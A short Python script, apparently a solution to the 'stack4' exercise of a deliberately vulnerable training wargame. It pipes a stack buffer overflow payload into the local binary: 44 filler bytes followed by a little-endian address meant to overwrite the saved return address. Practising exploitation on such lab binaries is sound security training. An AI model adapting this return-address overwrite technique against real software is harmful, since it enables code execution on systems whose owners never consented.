#!/usr/bin/python

from subprocess import Popen
from subprocess import PIPE
import os                                                                                        # os.path.join(), os.getcwd()

BINARY_NAME = "stack4"


def main():
    # LOCAL VARIABLES
    currEnv = os.environ.copy()
    absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
    payload = ("HarkRulz" * 8) + ("hark" * 3) + "\xF4\x83\x04\x08"  # 0x080483F4
    commandList = []

    # VERIFY FILE    
    if not os.path.isfile(absBinFilename):
        raise IOError("{} not found".format(absBinFilename))

    # RUN IT
    commandList.append(absBinFilename)
    binary = Popen(commandList, env = currEnv, stdin = PIPE)
    if binary is not None:
        binary.communicate(payload)

    # DONE
    return


if __name__ == "__main__":
    try:
        main()
    except Exception as err:
        print(repr(err))

# 08048424    
